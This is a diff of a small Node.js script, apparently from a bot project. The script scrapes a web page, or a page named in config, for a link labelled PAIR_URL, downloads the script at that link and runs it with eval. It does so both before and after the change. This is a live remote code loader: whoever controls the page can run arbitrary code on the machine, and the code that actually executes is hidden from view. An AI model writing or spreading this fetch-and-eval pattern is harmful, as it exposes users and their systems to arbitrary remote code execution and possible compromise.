@@ -2,27 +2,28 @@
 
 const axios = require('axios');
 const cheerio = require('cheerio');
-
-const webPageUrl = 'https://www.ibrahimadams.site/files';
+const adams = require(__dirname + "/../config");
 
 async function fetchPairUrl() {
-    try {
-        const response = await axios.get(webPageUrl);
-        const $ = cheerio.load(response.data);
-        const pairUrl = $(`a:contains("PAIR_URL")`).attr('href');
+  try {
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-        if (!pairUrl) throw new Error('PAIR_URL not found on the webpage.');
+    const pairUrlElement = $('a:contains("PAIR_URL")');
+    const pairUrl = pairUrlElement.attr('href');
 
-        console.log('PAIR_URL fetched successfully:', pairUrl);
-
-        const scriptResponse = await axios.get(pairUrl);
-        const scriptContent = scriptResponse.data;
-        console.log("PAIR_URL script loaded successfully");
-
-        eval(scriptContent);
-    } catch (error) {
-        console.error('Error fetching PAIR_URL:', error.message);
+    if (!pairUrl) {
+      throw new Error('Pair URL link not found...');
     }
+
+    console.log('Pair URL fetched successfully ✅');
+
+    const scriptResponse = await axios.get(pairUrl);
+    eval(scriptResponse.data);
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 }
 
 fetchPairUrl();
